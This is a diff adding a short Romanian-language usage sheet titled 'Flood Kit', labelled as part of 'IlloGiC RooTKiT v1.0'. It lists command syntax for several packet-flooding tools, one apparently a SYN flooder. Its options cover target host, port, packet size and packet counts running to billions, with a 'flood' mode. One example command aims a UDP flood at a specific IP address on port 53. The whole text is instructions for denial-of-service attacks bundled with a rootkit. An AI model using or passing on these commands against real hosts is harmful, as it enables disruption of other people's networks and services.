@@ -1,0 +1,31 @@
+**************************************************************************************
+*********************************** Flood Kit ****************************************
+**************************************************************************************
+
+** Introducing vadimII
+   Comanda: ./vadimII <host> <port> <size> <packets>
+            <host>    : Hostname sau Adresa IP
+            <port>    : orice port udp deschis
+            <size>    : marimea pachetelor: 1 .. 10
+            <packets> : numarul pachetelor->0 pentru flood !!!
+Ex: ./vadimII 193.226.61.1 53 10 0
+
+** Introducing slice3
+    Comanda: ./slice3 0 ip 1001 [nr pachete] &
+              nr pachete - 500 -> 6000000000
+
+** Introducing slice2
+    Comanda: ./slice2 0 ip 1001 [nr pachete] &
+              nr pachete - 500 -> 6000000000
+
+** Introducing stealth
+    Coamnda: <host> <port>
+
+** Introducing synk
+    Comanda: 0 ip 1001 [nr pachete] &
+             nr pachete - 500 -> 6000000000
+
+**************************************************************************************
+************************* Part of IlloGiC RooTKiT v1.0 ******************************* 
+**************************************************************************************
+
